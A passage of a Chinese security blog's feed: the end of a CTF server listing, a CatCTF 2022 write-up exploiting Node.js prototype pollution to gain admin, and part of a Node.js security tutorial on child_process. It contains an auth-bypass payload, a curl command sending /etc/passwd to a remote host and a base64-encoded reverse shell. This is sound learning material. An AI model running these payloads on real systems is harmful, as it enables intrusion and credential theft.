function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/countreport&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">in</span> <span class="title class_">Reportcache</span>) &#123;</span><br><span class="line">    count += <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Reportcache</span>[user]).<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; count &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看当前运行用户</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;^1.20.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cookie-parser&quot;</span>: <span class="string">&quot;^1.4.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;crypto&quot;</span>: <span class="string">&quot;^1.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;^4.21.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jsonwebtoken&quot;</span>: <span class="string">&quot;^9.0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>: <span class="string">&quot;^2.18.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;node-rsa&quot;</span>: <span class="string">&quot;^1.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;^0.12.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;require-in-the-middle&quot;</span>: <span class="string">&quot;^7.4.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/index.js</span></span><br><span class="line"><span class="keyword">var</span> ritm = <span class="built_in">require</span>(<span class="string">&#x27;require-in-the-middle&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> patchChildProcess = <span class="built_in">require</span>(<span class="string">&#x27;./child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ritm.<span class="title class_">Hook</span>(</span><br><span class="line">    [<span class="string">&#x27;child_process&#x27;</span>],</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span>, name</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (name) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;child_process&#x27;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">patchChildProcess</span>(<span class="variable language_">module</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/child_process.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchChildProcess</span>(<span class="params">cp</span>) &#123;</span><br><span class="line"></span><br><span class="line">    cp.<span class="property">execFile</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFile</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">fork</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">fork</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">spawn</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawn</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execFileSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFileSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>() &#125;);</span><br><span class="line">    cp.<span class="property">spawnSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawnSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchOptions</span>(<span class="params">hasArgs</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">apply</span>(<span class="params">target, thisArg, args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos === args.<span class="property">length</span>) &#123;</span><br><span class="line">            args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; args.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasArgs &amp;&amp; (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(args[pos]) || args[pos] == <span class="literal">null</span>)) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>(args[pos]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[pos] == <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                args.<span class="title function_">splice</span>(pos, <span class="number">0</span>, <span class="title function_">prototypelessSpawnOpts</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target.<span class="title function_">apply</span>(thisArg, args);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">prototypelessSpawnOpts</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> prototypelessObj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), obj);</span><br><span class="line">    prototypelessObj.<span class="property">env</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), prototypelessObj.<span class="property">env</span> || process.<span class="property">env</span>);</span><br><span class="line">    <span class="keyword">return</span> prototypelessObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = patchChildProcess;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>这个博客作者没有仔细看前端代码跑去爆破了<a href="https://xz.aliyun.com/t/15785?time__1311=GqjxnQGQDQoCqGXPeewqQuRDfg/YtDgCaoD#toc-1">详细题解1 有中间思路</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wife_CatCTF22</title>
      <link href="/2024/11/01/wife_CatCTF22/"/>
      <url>/2024/11/01/wife_CatCTF22/</url>
      
        <content type="html"><![CDATA[<blockquote><p>黑盒原型链污染，原型链污染绕过身份验证</p></blockquote><h2 id="分析与尝试-DONE"><a href="#分析与尝试-DONE" class="headerlink" title="分析与尝试 DONE"></a>分析与尝试 DONE</h2><ol><li><p>注意到服务端使用node express框架，可以故意报错搞点信息，比如多谢一个段等</p></li><li><p>先看看node这边的漏洞试试，现在就是要登录为admin用户，猜测flag在admin中，有两个思路</p><ol><li>获取admin的账号与密码</li><li>node相关的可能是原型链污染？服务端<ol><li>admin直接登录，服务端一般会保存一个存有用户信息的对象，这里如果对于普通用户没有设置admin就可能通过原型链进行覆盖(直接clone的话)，如果有设置admin&#x3D;false那就不行 -&gt; 比2有可能，都试试，先这个，<strong>但是这里试试去掉isAdmin&#x3D;false是可以的</strong>，可以从第二种情况去到第一种情况</li><li>注册一个admin用户，这个code涉及到邀请码(不是验证码)的设计，考虑一般和数据库相关，原型链覆盖也无从下手 -&gt; 如果是对象的话在Object处进行覆盖是无法通过原型链访问到的，因为自己就有<strong>可能性不大</strong></li></ol></li></ol></li><li><p>确定先通过admin直接登录探测，下一步就是要找到键了，发现在注册中有一个isAdmin会不会在邀请码对的时候进行clone？试试，想要直接登录的话还是要先注册，普通注册+原型链污染</p></li><li><p>最终payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /register <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;h4ck3r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="题解白盒一下"><a href="#题解白盒一下" class="headerlink" title="题解白盒一下"></a>题解白盒一下</h2><ol><li><em><strong>注意点就是Object.assign()在JSON.parse()下存在原型链污染</strong></em></li><li>可以多多fuzz</li><li><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/">官方题解的源码</a></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs安全</title>
      <link href="/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"/>
      <url>/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Nodejs前置知识"><a href="#Nodejs前置知识" class="headerlink" title="Nodejs前置知识"></a>Nodejs前置知识</h2><h3 id="CJS-and-EJS"><a href="#CJS-and-EJS" class="headerlink" title="CJS and EJS"></a>CJS and EJS</h3><ol><li><p>CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制</p><ol><li>兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本</li></ol></li><li><p>CJS</p><ol><li><strong>同步加载</strong>: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在执行当前文件代码之前，所有通过 require 加载的依赖都会被解析并执行</li><li>使用场景: 非常适合服务器端应用，因为服务器端通常不需要考虑加载时间的影响</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块操作: require和exports</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">const</span> myModule = <span class="built_in">require</span>(<span class="string">&#x27;./myModule&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>ES6</p><ol><li><strong>异步加载</strong>: 异步加载的</li><li><strong>静态</strong>: ES6模块的设计是静态的，即模块的依赖关系必须在编译时确定，这允许工具进行优化，如tree shaking等</li><li>使用场景: 适合现代Web应用，特别是单页应用程序（SPA），以及任何希望利用最新JavaScript特性的项目</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import和export</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">qux</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; bar, qux &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, baz &#125; <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> myModule <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>; <span class="comment">// 导入整个模块</span></span><br></pre></td></tr></table></figure></li><li><p><strong>分辨</strong></p><ol><li>CommonJS模块和ES6模块的不同可以体现在package.json的type字段，当type字段为空或者为”commonjs”时，当前目录下的.js脚本会解释成CommonJS模块，如果type字段为module,.js解释为ES模块</li></ol></li></ol><h3 id="module-in-CJS"><a href="#module-in-CJS" class="headerlink" title="module in CJS"></a>module in CJS</h3><ol><li><p><strong>什么是模块</strong>: 在Node.js中，模块是指一个文件或一组文件，其中定义了一组相关的函数、变量和对象，以便可以重复使用 -&gt; 每个文件都被视为一个模块，文件路径就是模块名</p></li><li><p><strong>使用模块</strong></p><ol><li><p><strong>加载</strong>: 使用require函数可以加载模块并访问其内容，<code>require()</code>: 这是一个全局函数，用来加载模块。当调用require时，Node.js会查找指定的模块并执行其代码，然后返回该模块的导出对象；</p><ol><li>返回值：<code>require()</code>函数返回<code>module.exports</code>对象</li><li>module.exports：这是一个对象，可以通过赋值给它来导出模块中的内容。<em>默认情况下它是一个空对象</em><ol><li>如果只需要导出一个函数、对象或其他值，可以直接将其赋值给 module.exports</li><li>如果需要导出多个函数或对象，可以将它们作为属性添加到 module.exports 对象中</li></ol></li></ol></li><li><p><strong>共享</strong>: 通过module.exports将模块内的成员共享出去，每个Node.js文件都有一个module变量，<code>module.exports</code>对象用于公开模块中的函数、对象或值，以便它们可以在其他模块中使用。代表当前模块 –&gt; 这里指定add是模块中的add函数这样</p><ol><li>当需要模块时，分配给module.exports的任何内容都可用。</li><li><strong>exports赋值问题</strong><ol><li><code>exports</code>: 是 module.exports 的一个引用， 当你向 exports 添加属性或方法时，你实际上是在修改 module.exports</li><li>如果直接给 exports 赋予一个新的值（比如另一个对象），那么此时 exports 就不再是 module.exports 的引用了，但是不影响 module.exports</li><li>要影响 module.exports 需要直接进行修改</li><li><strong>最佳实践</strong>: exports 应该用来添加属性或方法，而不是重新赋值整个对象。如果你需要替换整个 module.exports 对象，请直接使用 module.exports</li></ol></li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 导出函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">subtract</span>: subtract</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>); <span class="comment">// 加载本地模块</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>缓存</strong>: 当加载模块时，它会被缓存以提高性能；对同一模块的后续require调用将返回缓存的实例，确保该模块仅执行一次</p></li><li><p><strong>module type</strong></p><ol><li>核心模块：这些是由Node.js提供的内置模块，可以直接被<code>require()</code>函数调用，无需安装</li><li>本地模块：这些是你自己创建的文件或者项目中的文件。你可以定义自己的功能并通过exports对象来暴露它们</li><li>第三方模块：这些是从npm (Node Package Manager) 安装的外部库。npm拥有世界上最大的软件注册表，包含了无数个开源包，几乎可以满足任何开发需求 –&gt; 用npm安装后再<code>require()</code></li></ol></li></ol><h3 id="Express中间件"><a href="#Express中间件" class="headerlink" title="Express中间件"></a>Express中间件</h3><h3 id="Nodejs执行系统命令"><a href="#Nodejs执行系统命令" class="headerlink" title="Nodejs执行系统命令"></a>Nodejs执行系统命令</h3><h4 id="Inject-Point-载体≈代码执行"><a href="#Inject-Point-载体≈代码执行" class="headerlink" title="Inject Point(载体≈代码执行)"></a>Inject Point(载体≈代码执行)</h4><ol><li><code>eval(&#39;console.log(&quot;hello world&quot;)&#39;)</code>，类似php eval</li><li>各种类型的回调函数，与时间相关 -&gt; 在漏洞中体现为可控输入(注意原型链)<ol><li><code>Function(&quot;console.log(&#39;HelloWolrd&#39;)&quot;)()</code>类似php的create_function</li><li><code>setTimeout(some_function, 2000)</code></li><li><code>setInteval(some_function, 2000)</code></li></ol></li></ol><h4 id="child-process-内置-module"><a href="#child-process-内置-module" class="headerlink" title="child_process 内置 module"></a>child_process 内置 module</h4><ol><li><p>child_process模块提供了以类似于popen(3)的方式生成子进程的能力，但不完全相同</p></li><li><p>命令<code>console.log(require(&#39;child_process&#39;))</code>返回一下内容 -&gt; 返回的是一个带有很多方法的对象，可以用于执行命令</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h5 id="1-child-process-exec-command-options-callback-和child-process-execSync-command-options"><a href="#1-child-process-exec-command-options-callback-和child-process-execSync-command-options" class="headerlink" title="1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])"></a>1. <code>child_process.exec(command[, options][, callback])</code>和<code>child_process.execSync(command[, options])</code></h5><ol><li><p><code>child_process.exec(command[, options][, callback])</code></p><ol><li><p><strong>不使用callback无法直接获取输出</strong>: 会立即打印出ChildProcess对象，但不会等待命令执行完毕。因此，你看到的是子进程启动时的状态，而不是命令执行的结果 –&gt; <strong>不过命令是会执行的</strong>，需要回显时考虑<code>require(&#39;child_process&#39;).exec(&#39;ls&#39;,(error,stdout,stderr)=&gt;&#123;console.log(stdout)&#125;)</code></p><ol><li>exec函数返回一个ChildProcess对象。这个对象代表了新创建的子进程，并提供了与该子进程交互的方法和属性</li></ol></li><li><p>一些常用的payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);  <span class="comment">// curl传输文件，可以考虑重定向文件发出信息ls</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol></li><li><p><code>child_process.execSync(command[, options])</code></p><ol><li><strong>同步阻塞非异步</strong>: exec() 和 execSync() 函数可用于执行命令并返回其输出。exec() 是异步的，这意味着它在命令完成之前就返回，而 execSync() 是同步的，这意味着它在命令完成之前阻塞<ol><li>可以利用这个情况获取输出比如<code>ls</code>命令这些</li></ol></li><li>常见payload和1.中的一样</li></ol></li></ol><h5 id="2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options"><a href="#2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options" class="headerlink" title="2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])"></a>2. <code>child_process.spawn(command[, args][, options])</code>和<code>child_process.spawnSync(command[, args][, options])</code></h5><ol><li><code>child_process.spawn(command[, args][, options])</code><ol><li><p><strong>child_process基础函数</strong>: child_process模块中所有函数都是基于spawn和spawnSync函数的来实现的，换句话来说，spawn和spawnSync函数的配置是最完全的，其它函数都是对其做了封装和修改</p></li><li><p><strong>实现子进程与父进程的通信</strong>: child_process.spawn()方法使用给定的command生成一个新进程，并在args中使用命令行参数 -&gt; 